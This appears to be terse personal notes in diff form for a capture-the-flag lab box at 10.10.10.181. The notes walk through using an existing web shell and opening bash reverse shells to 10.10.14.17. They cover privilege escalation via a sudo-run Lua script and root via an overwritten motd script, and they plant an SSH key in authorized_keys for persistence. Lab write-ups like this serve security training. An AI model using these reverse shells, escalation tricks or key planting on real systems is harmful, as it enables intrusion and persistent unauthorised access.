@@ -1,0 +1,25 @@
+//Based on TRX
+http://10.10.10.181/smevk.php
+cat ls /home/webadmin/note.txt	//Lua
+bash -c 'bash -i >& /dev/tcp/10.10.14.17/9001 0>&1'
+nc -lvnp 9001	//shell as webadmin
+
+cat priv.lua 
+require('os');
+os.execute('/bin/bash');
+
+sudo -u sysadmin /home/sysadmin/luvit priv.lua	//shell as sysadmin
+
+pspy shows: /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+ls -al /etc/update-motd.d/
+00-header	//header for ssh, when starting ssh this will run (gotta do fast 30 sec to update 00-header file)
+bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'
+
+
+
+//to login as sysadmin with ssh
+ssh-keygen
+copy id_rsa.pub to /home/sysadmin/.ssh/authorized_keys 
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXApu3joYHe7Q6rE8WF++eojgBe88o68botYMlhquIIcnl5e5LiWSr94lPuBZntPlgVCBo1Tzc+RcRl7szlKIStXo4AxV6VGFT4JUoyHnNWJFXKnZvPG26KoFBEQ74R4lBdDbdPZVRsXszKq6o1v8BiAGuZcqltk/BboD79QCm7OudGby//BQr5WEJMieRVeJjmocHWtQkEKTfb2qu9neW9RHPpqUQGpVkw2DQ1PPZFR+bfXrp5Khvg+3MUGo6ij7Fu9fQ6RkFdtiOYElKnQYkLYsu5KTGLH6shx3hOGMdfCcbGmQk/FFL0OGJ0t/r1RpZ9880/8ycdOlkSRiqc8i0mTPRnAT6eWNmCmT0haK0MRie5Bezuo8BXQnmoz5YbIyWLxcCRcFHikc1V7fD2uYMzPMvCZE5JjLMYRpqo7XbVbNQTJL86rksZX4S9gUP075RsF5keyjyqxN+pQb4ci7dlbVAbbfhbMjUFe8BWZaPzOUHFV9Cx2fwOWMeR4PVsyk=" >> /home/sysadmin/.ssh/authorized_keys
+chmod 400 id_rsa
+ssh -i id_rsa sysadmin@10.10.10.181
